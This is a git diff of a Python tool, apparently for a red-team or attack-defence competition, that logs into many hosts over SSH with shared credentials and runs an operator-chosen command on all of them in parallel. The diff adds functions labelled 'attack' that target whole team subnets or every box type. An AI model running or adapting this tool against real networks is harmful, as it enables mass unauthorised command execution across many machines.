@@ -5,8 +5,11 @@
 import paramiko
 from concurrent.futures import ThreadPoolExecutor
 
-WORKERS=10 #how many threads run at once
+WORKERS=30 #how many threads run at once
+HOSTNAME_DICT={'BIG BANG':1,'DINO ASTEROID':2,'VIKING RAIDS':4,'ENLIGHTENMENT':5,'CHERNOBYL':6}
 
+
+#ONE CONNECTION (called durring the multi-connect)
 def single_connection_command(hostname_in,username_in,password_in,command_in):
     try:
         client = paramiko.SSHClient()
@@ -22,12 +25,14 @@ def single_connection_command(hostname_in,username_in,password_in,command_in):
     except Exception as e:
         print("Unexpected error on host ",hostname_in,", ",e,sep="")
 
+#MAKES THE CUSTOM IPS ONE WILDCARD
 def make_target_list(ip_string, variable_list): # pass it a string to be modified (ex 192.168.x.2 or 10.x.1.5), and a list of numbers to fill it in with ex [1,2,5,6,7,8]
     to_return=list()
     for number in variable_list:
         to_return.append(str(ip_string).replace('x',str(number)))
     return to_return
 
+#MAKES THE CUSTOM IPS TWO WILDCARD
 def make_target_list_two_var(ip_string, variable_list_x, variable_list_y): 
     to_return=list()
     for number_x in variable_list_x:
@@ -36,12 +41,14 @@ def make_target_list_two_var(ip_string, variable_list_x, variable_list_y):
     return to_return
 
 
+#RUNS THE MINIONS
 def run_multiple_multithread(ip_list,username,password,command):
-    # target_list=make_target_list(ip_string,ip_list)
     with ThreadPoolExecutor(max_workers=WORKERS) as executor:
         for ip in ip_list:
             executor.submit(single_connection_command, ip,username,password,command)
 
+
+#ATTACK FUNCTIONS
 
 def team_attack(teamnumber,username,password,command):
     targets=make_target_list("192.168."+str(teamnumber)+".x",[1,2])
@@ -49,7 +56,19 @@ def team_attack(teamnumber,username,password,command):
     targets=targets+targets2
     run_multiple_multithread(targets,username,password,command)
 
+def box_attack(box_hostname,username,password,command):
+    targets=list()
+    if HOSTNAME_DICT[box_hostname] <3:
+        targets=make_target_list("192.168.x."+str(HOSTNAME_DICT[box_hostname]),list(range(1,19)))
+    else:
+        targets=make_target_list("10.x.1."+str(HOSTNAME_DICT[box_hostname]),list(range(1,19)))
+    run_multiple_multithread(targets,username,password,command)
+        
+def all_attack(username,password,command):
+    for key in HOSTNAME_DICT:
+        box_attack(key,username,password,command)
 
+#CLI
 def cli_interface():
     box_targets=['BIG BANG','DINO ASTEROID','VIKING RAIDS','ENLIGHTENMENT','CHERNOBYL']
     print("\n ~~ SNAKE CHARMER ~~\n")
@@ -63,7 +82,7 @@ def cli_interface():
     command=input("\nCommand to run: ")
 
     #Get the target ip
-    targets_input = input("Enter either a: \n-Single IP address\n-IP target framework ('192.168.x.y/10.x.1.y'), \n-A single team name ('team01','team02','team13 [include leading 0]'), a single box type ('Viking Raid')\n-All ('All')\nInput: ").upper()
+    targets_input = input("Enter either a: \n-Single IP address\n-IP target framework ('192.168.x.y/10.x.1.y'), \n-A single team name ('team01','team2', ... ,'team18'), \n-Single box type ('Big Bang, Dino Asteroid, Viking Raids, Enlightenment, Chernobyl')\n-All ('All')\nInput: ").upper()
     print(targets_input)
 
     if "TEAM" in targets_input:
@@ -76,12 +95,12 @@ def cli_interface():
         team_attack(teamnum,username,password,command)
 
     elif any(box in targets_input for box in box_targets):
-        print('brooooo get that boox')
+        box_attack(targets_input,username,password,command)
     elif "ALL" in targets_input:
-        pass
+        all_attack(username,password,command)
     else:
-        x_number=input("Enter every number you want for x (ex 1 or 1,2,4,5,6)\nx field:")
-        y_number=input("Enter every number you want for y (ex 1 or 1,2,4,5,6)\ny field:")
+        x_number=input("Enter every number you want for x seperated by just a comma (ex 1 or 1,2,4,5,6)\nx field:")
+        y_number=input("Enter every number you want for y seperated by just a comma (ex 1 or 1,2,4,5,6)\ny field:")
         print(input,x_number,y_number)#TODO add a catch / exception raise if invalid input is given via a failed parse
         
 def main():
